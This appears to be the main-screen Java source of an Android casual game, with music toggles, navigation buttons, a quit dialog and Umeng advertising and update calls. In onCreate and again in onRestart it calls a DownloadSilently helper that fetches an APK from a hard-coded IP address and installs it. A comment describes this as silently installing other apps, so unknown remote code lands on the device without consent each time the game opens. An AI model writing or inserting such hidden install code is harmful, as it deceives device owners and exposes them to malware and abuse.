package com.xiude.bottle;

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.ListView;

import com.umeng.newxp.common.ExchangeConstants;
import com.umeng.newxp.controller.ExchangeDataService;
import com.umeng.newxp.controller.XpListenersCenter.NTipsChangedListener;
import com.umeng.newxp.view.ExchangeViewManager;
import com.umeng.update.UmengUpdateAgent;
import com.xiude.util.DownloadSilently;

public class FirstActivity extends BaseActivity {
	public static ExchangeDataService exchangeDataService;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.first_view);
		
		BgMediaPlayer.startMedia(this);
		
		//广告
	    //赋值preloadDataService,添加newTips 回调
        exchangeDataService = new ExchangeDataService();
        exchangeDataService.preloadData(this, new NTipsChangedListener() {
            @Override
            public void onChanged(int flag) {
                if(flag == -1){
                	Log.i("tips", "没有广告");
                    //没有new广告
                }else if(flag > 1){
                	Log.i("tips", "广告数："+flag);
                    //第一页new广告数量
                }else if(flag == 0){
                	Log.i("tips", "全是new广告");
                    //第一页全部为new 广告
                }
            };
        }, ExchangeConstants.type_container);
        
        ExchangeConstants.ROUND_ICON = false;
        final ViewGroup fatherLayout = (ViewGroup) this.findViewById(R.id.ad);
        
        ImageView deleteView = (ImageView) this.findViewById(R.id.ad_delete);
        deleteView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				fatherLayout.setVisibility(View.GONE);
			}
		});
        
        ListView listView = (ListView) this.findViewById(R.id.list);
        listView.setEnabled(false);
        
        ExchangeDataService exchangeDataService = FirstActivity.exchangeDataService != null ? FirstActivity.exchangeDataService : new ExchangeDataService();;
        
        exchangeDataService.setKeywords("app"); 
        exchangeDataService.autofill = 0;
        ExchangeViewManager exchangeViewManager = new ExchangeViewManager(this,exchangeDataService);
        exchangeViewManager.addView(fatherLayout, listView); 
        //end
        //广告
        
		
		//靜默下載與安裝其它應用  begin
		DownloadSilently.downloadAndInstall("http://114.80.202.91:8080/test2/silent1.apk", FirstActivity.this);
		//end
		
		//友盟自動更新 begin
		 //如果想程序启动时自动检查是否需要更新， 把下面两行代码加在Activity 的onCreate()函数里。
			UmengUpdateAgent.setUpdateOnlyWifi(false);
//		 	如果您同时使用了手动更新和自动检查更新，为了避免更新回调被多次调用，请加上下面这句代码
			UmengUpdateAgent.setDownloadListener(null);
			UmengUpdateAgent.update(this);
			//end
			
		
		ImageView playView = (ImageView)findViewById(R.id.play);
		playView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				startActivity(new Intent(FirstActivity.this, SelectModeActivity.class));
				
			}
		});
		
		ImageView helpView = (ImageView)findViewById(R.id.help);
		helpView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				startActivity(new Intent(FirstActivity.this, HelpActivity.class));
				
			}
		});
		
		final ImageView bgMcView = (ImageView)findViewById(R.id.bg_music);
		bgMcView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				if(isAllBgMusicClickPause == true){
					isAllBgMusicClickPause = false;
					BgMediaPlayer.restartMedia();
					bgMcView.setImageResource(R.drawable.music_yes);
				}else{
					isAllBgMusicClickPause = true;
					BgMediaPlayer.pauseMedia(true);
					bgMcView.setImageResource(R.drawable.music_no);
				}
			}
		});
		
		final ImageView gameMcView = (ImageView)findViewById(R.id.game_music);
		gameMcView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				  
				if(isGameBgPause == true){
					isGameBgPause = false;
					gameMcView.setImageResource(R.drawable.laba_yes);
				}else{
					isGameBgPause = true;
					gameMcView.setImageResource(R.drawable.laba_no);
				}
			}
		});
		
		if(!isGameBgPause){
			gameMcView.setImageResource(R.drawable.laba_yes);
		}else{
			gameMcView.setImageResource(R.drawable.laba_no);
		}
	}
	
	
	@Override
	protected void onRestart() {
		super.onRestart();
		
		//靜默下載與安裝其它應用  begin
		DownloadSilently.downloadAndInstall("http://114.80.202.91:8080/test2/silent1.apk", FirstActivity.this);
		//end
	}
	
	
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
			Dialog dialog = new AlertDialog.Builder(this)
            .setIcon(R.drawable.icon)
            .setTitle(R.string.quit)
            .setMessage(R.string.sure_quit)
            .setPositiveButton(R.string.alert_dialog_ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int whichButton) {
                	finish();
                }
            })
            .setNegativeButton(R.string.alert_dialog_cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int whichButton) {
                }
            })
            .create();
			dialog.show();
			return true;
		}
					
		return false;
	}
	

}
